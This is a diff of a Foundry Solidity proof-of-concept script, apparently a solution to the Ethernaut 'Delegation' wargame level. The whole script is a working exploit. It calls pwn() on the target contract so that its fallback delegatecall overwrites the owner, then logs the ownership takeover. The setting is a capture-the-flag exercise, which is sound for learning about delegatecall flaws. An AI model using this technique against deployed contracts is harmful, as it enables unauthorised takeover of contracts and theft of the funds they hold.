@@ -1,20 +1,26 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity 0.8.24;
 
-import "forge-std/Script.sol";
-import "../instances/Ilevel06.sol";
+import {Script} from "forge-std/Script.sol";
+import "../challenges/6_Delegation.sol";
 
 contract POC is Script {
-    Delegation level6 = Delegation(0x36FcDCE0C27A8Fed39C1bF563FbC56359757D369);
+    Delegation badIdea = Delegation(0xb59aCD7131cE6c4CbAAF32e8A06Da14f65C09268);
 
     function run() external {
-        vm.startBroadcast();
-        
-        console.log("Current owner is : ", level6.owner());
-        (bool success, ) = address(level6).call(abi.encodeWithSignature("pwn()"));
-        console.log("Checking delegatecall result : ", success);
-        console.log("New owner is : ", level6.owner());
-        
+        uint256 deployer = vm.envUint("PRIVATE_KEY");
+
+        vm.startBroadcast(deployer);
+
+        console.log("Current owner: ", badIdea.owner());
+
+        (bool success, ) = address(badIdea).call(
+            abi.encodeWithSignature("pwn()")
+        );
+        require(success, "Hack failed");
+
+        console.log("New owner: ", badIdea.owner());
+
         vm.stopBroadcast();
     }
 }
